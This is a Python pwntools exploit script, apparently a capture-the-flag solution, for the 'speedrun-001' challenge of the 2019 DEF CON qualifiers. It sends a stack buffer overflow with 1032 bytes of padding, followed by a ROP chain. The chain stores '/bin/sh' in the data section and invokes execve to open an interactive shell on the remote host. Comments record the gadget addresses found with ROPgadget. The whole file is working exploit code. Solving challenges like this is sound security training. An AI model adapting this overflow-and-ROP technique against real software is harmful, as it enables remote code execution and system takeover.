from pwn import *
from struct import pack
from operator import *
from binascii import hexlify

host = 'speedrun-001.quals2019.oooverflow.io'
port = '31337'
r = remote(host, port)
# r = process("./speedrun-001")
r.recvuntil("Any last words?")

""" 
ROP Chain usefull output
./ROPgadget.py --binary ~/CTF/learning/exploit/speedrun-001/speedrun-001 --ropchain

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x47f471 mov qword ptr [rsi], rax ; ret
	[+] Gadget found: 0x4101f3 pop rsi ; ret
	[+] Gadget found: 0x415664 pop rax ; ret
	[+] Gadget found: 0x444bc0 xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x444bc0 xor rax, rax ; ret
	[+] Gadget found: 0x4748c0 add rax, 1 ; ret
	[+] Gadget found: 0x4748c1 add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x400686 pop rdi ; ret
	[+] Gadget found: 0x4101f3 pop rsi ; ret
	[+] Gadget found: 0x4498b5 pop rdx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x40129c syscall
"""

""" 
sys_execve(%rdi=const char *filename, %rsi=const char *const argv[], %rdx=const char *const envp[])
rdi => pointer to string /bin/sh
rsi => 0x00
rdx => 0x00
"""

pop_rax = p64(0x415664)
pop_rdi = p64(0x400686)
pop_rsi = p64(0x4101f3)
pop_rdx = p64(0x4498b5)


# First we will store /bin/sh in some place empty in data section
# .data empty location found with ida-pro = 00000000006BA360  => p64(0x6BA360)
data_addr = p64(0x6BA360)
bin_sh = p64(0x0068732f6e69622f)

store_shell_payload = pop_rax + bin_sh + pop_rsi + data_addr + p64(0x47f471)


syscall = p64(0x40129c)


payload = '0' * 1032   # 1032 chars until RIP 
payload += store_shell_payload


payload += pop_rax + p64(0x3b)  # syscal 59 (execve)
payload += pop_rdi + data_addr
payload += pop_rsi + p64(0)
payload += pop_rdx + p64(0)
payload += syscall

r.send(payload)

r.interactive()